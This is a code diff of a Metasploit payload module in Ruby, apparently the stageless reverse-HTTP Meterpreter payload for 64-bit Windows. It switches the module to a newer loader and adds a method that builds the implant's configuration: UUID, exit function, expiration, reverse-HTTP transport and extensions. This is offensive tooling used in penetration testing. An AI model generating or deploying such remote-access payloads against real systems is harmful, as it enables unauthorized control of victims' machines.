@@ -6,7 +6,7 @@
 require 'msf/core'
 require 'msf/core/handler/reverse_http'
 require 'msf/core/handler/reverse_http/stageless'
-require 'msf/core/payload/windows/x64/stageless_meterpreter'
+require 'msf/core/payload/windows/x64/meterpreter_loader'
 require 'msf/base/sessions/meterpreter_x64_win'
 require 'msf/base/sessions/meterpreter_options'
 
@@ -14,7 +14,10 @@ module Metasploit4
 
   CachedSize = :dynamic
 
-  include Msf::Payload::Windows::StagelessMeterpreter_x64
+  include Msf::TransportConfig
+  include Msf::Payload::Windows
+  include Msf::Payload::Single
+  include Msf::Payload::Windows::MeterpreterLoader_x64
   include Msf::Handler::ReverseHttp::Stageless
   include Msf::Sessions::MeterpreterOptions
 
@@ -35,13 +38,32 @@ module Metasploit4
   end
 
   def generate
-    # generate a stageless payload using the x64 version of
-    # the stageless generator
-    opts = {
-      :ssl       => false,
-      :generator => method(:generate_stageless_x64)
+    stage_meterpreter + generate_config
+  end
+
+  def generate_config(opts={})
+    unless opts[:uuid]
+      opts[:uuid] = Msf::Payload::UUID.new({
+        :platform => 'windows',
+        :arch     => ARCH_X64
+      })
+    end
+
+    # create the configuration block
+    config_opts = {
+      :arch       => opts[:uuid].arch,
+      :exitfunk   => datastore['EXITFUNC'],
+      :expiration => datastore['SessionExpirationTimeout'].to_i,
+      :uuid       => opts[:uuid],
+      :transports => [transport_config_reverse_http(opts)],
+      :extensions => (datastore['EXTENSIONS'] || '').split(',')
     }
-    generate_stageless(opts)
+
+    # create the configuration instance based off the parameters
+    config = Rex::Payloads::Meterpreter::Config.new(config_opts)
+
+    # return the binary version of it
+    config.to_b
   end
 
 end
